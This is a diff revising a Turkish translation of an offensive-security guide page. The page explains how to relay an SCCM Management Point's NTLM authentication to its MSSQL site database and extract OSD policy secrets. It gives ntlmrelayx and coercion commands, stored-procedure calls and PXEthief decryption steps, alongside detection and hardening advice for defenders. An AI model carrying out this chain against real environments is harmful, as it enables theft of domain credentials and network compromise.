@@ -3,18 +3,18 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Bir **System Center Configuration Manager (SCCM) Yönetim Noktası (MP)**'nı SMB/RPC üzerinden kimlik doğrulamaya zorlayarak ve bu NTLM makine hesabını **site veritabanına (MSSQL)** **relay** ederek `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz. Bu roller, **Operating System Deployment (OSD)** politika blob'larını (Ağ Erişim Hesabı kimlik bilgileri, Görev Dizisi değişkenleri vb.) açığa çıkaran bir dizi saklı prosedürü çağırmanıza olanak tanır. Blob'lar hex kodlu/şifreli olup, **PXEthief** ile çözülebilir ve şifresi çözülebilir, düz metin gizli bilgileri verir.
+Bir **System Center Configuration Manager (SCCM) Yönetim Noktası (MP)**'nı SMB/RPC üzerinden kimlik doğrulamaya zorlayarak ve bu NTLM makine hesabını **site veritabanına (MSSQL)** **aktarıp** `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz. Bu roller, **İşletim Sistemi Dağıtımı (OSD)** politika blob'larını (Ağ Erişim Hesabı kimlik bilgileri, Görev Dizisi değişkenleri vb.) açığa çıkaran bir dizi saklı prosedürü çağırmanıza olanak tanır. Blob'lar hex kodlu/şifreli olup, **PXEthief** ile çözülebilir ve şifresi çözülebilir, düz metin gizli bilgileri verir.
 
 Yüksek seviyeli zincir:
-1. MP & site DB'yi keşfedin ↦ kimlik doğrulaması yapılmamış HTTP uç noktası `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlatın.
-3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak zorlayın.
-4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile relay edilen **<DOMAIN>\\<MP-host>$** hesabı olarak bağlanın.
-5. Aşağıdakileri yürütün:
+1. MP & site DB'yi keşfet ↦ kimlik doğrulaması yapılmamış HTTP uç noktası `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlat.
+3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak zorla.
+4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile aktarılan **<DOMAIN>\\<MP-host>$** hesabı olarak bağlan.
+5. Şu komutları çalıştır:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
-6. `0xFFFE` BOM'u çıkarın, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
+6. `0xFFFE` BOM'u çıkar, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
 `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` gibi gizli bilgiler, PXE veya istemcilerle etkileşime girmeden kurtarılır.
 
@@ -27,7 +27,7 @@ MP ISAPI uzantısı **GetAuth.dll**, kimlik doğrulaması gerektirmeyen birkaç 
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | Site imzalama sertifikası genel anahtarını + *x86* / *x64* **Tüm Bilinmeyen Bilgisayarlar** cihazlarının GUID'lerini döndürür. |
 | `MPLIST` | Sitedeki her Yönetim Noktasını listeler. |
-| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (LDAP olmadan site sunucusunu tanımlayın). |
+| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (LDAP olmadan site sunucusunu tanımlamak için). |
 
 Daha sonraki DB sorguları için **clientID** olarak kullanılacak GUID'leri alın:
 ```bash
@@ -81,7 +81,7 @@ Eğer zaten `PolicyID` ve `PolicyVersion`'a sahipseniz, clientID gereksinimini a
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> ÖNEMLİ: SSMS'de "Maksimum Alınan Karakter" değerini artırın (>65535) aksi takdirde blob kesilecektir.
+> ÖNEMLİ: SSMS'de "Alınan Maksimum Karakter" değerini artırın (>65535) aksi takdirde blob kesilecektir.
 
 ---
 
@@ -93,7 +93,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-Kurtarılan gizli bilgiler örneği:
+Recovered secrets example:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -113,7 +113,7 @@ Bu roller, bu saldırıda kullanılan ana EXEC izinleri de dahil olmak üzere, o
 |------------------|---------|
 | `MP_GetMachinePolicyAssignments` | Bir `clientID` için uygulanan politikaları listele. |
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Tam politika gövdesini döndür. |
-| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` yolu tarafından döndürülen. |
+| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` yolu tarafından döndürülür. |
 
 Tam listeyi inceleyebilirsiniz:
 ```sql
@@ -127,10 +127,10 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 6. Tespit ve Güçlendirme
-1. **MP oturumlarını izleyin** – herhangi bir MP bilgisayar hesabı, ana bilgisayarı olmayan bir IP'den oturum açıyorsa ≈ relay.
+1. **MP oturumlarını izleyin** – herhangi bir MP bilgisayar hesabının, ana bilgisayarı olmayan bir IP'den oturum açması ≈ relay.
 2. Site veritabanında **Kimlik Doğrulama için Genişletilmiş Koruma (EPA)**'yı etkinleştirin (`PREVENT-14`).
 3. Kullanılmayan NTLM'yi devre dışı bırakın, SMB imzasını zorlayın, RPC'yi kısıtlayın (aynı önlemler `PetitPotam`/`PrinterBug` için kullanılır).
-4. MP ↔ DB iletişimini IPSec / karşılıklı TLS ile güçlendirin.
+4. MP ↔ DB iletişimini IPSec / karşılıklı-TLS ile güçlendirin.
 
 ---
 
@@ -148,7 +148,7 @@ abusing-ad-mssql.md
 
 
 ## Referanslar
-- [Yöneticiyle Konuşmak İsterim: Yönetim Noktası Relay'leri ile Gizli Bilgileri Çalma](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Yöneticiyle Konuşmak İsterim: Yönetim Noktası Relay'leri ile Gizli Bilgileri Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [Yanlış Yapılandırma Yöneticisi – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
